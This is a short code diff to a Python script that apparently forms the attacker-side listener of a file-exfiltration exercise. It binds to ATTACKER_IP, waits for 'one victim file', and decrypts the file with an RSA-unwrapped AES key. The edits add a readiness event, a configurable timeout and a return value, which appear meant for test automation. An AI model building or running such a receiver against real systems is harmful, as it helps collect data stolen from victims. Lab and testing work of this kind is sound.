@@ -19,7 +19,7 @@ from shared.crypto import aes_decrypt, rsa_unwrap_key
 from shared.transfer_protocol import receive_header, recv_exact, tag
 
 
-def receive_once():
+def receive_once(*, ready=None, accept_timeout=60):
     root = Path(PROJECT_ROOT).resolve()
     private_path = Path(RSA_PRIV_KEY_PATH).resolve(strict=True)
     if private_path.is_relative_to(root):
@@ -34,8 +34,10 @@ def receive_once():
         server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
         server.bind((ATTACKER_IP, TRANSFER_PORT))
         server.listen(1)
-        server.settimeout(60)
+        server.settimeout(accept_timeout)
         print(f"Listening on {ATTACKER_IP}:{TRANSFER_PORT} for one victim file...", flush=True)
+        if ready is not None:
+            ready.set()
         connection, address = server.accept()
         with connection:
             connection.settimeout(15)
@@ -73,6 +75,7 @@ def receive_once():
                 stream.write(json.dumps(record, sort_keys=True) + "\n")
             connection.sendall(b"OK\n")
             print(f"PASS: recovered {name} ({len(plaintext)} bytes), SHA-256 {digest}", flush=True)
+            return record
 
 
 def main():
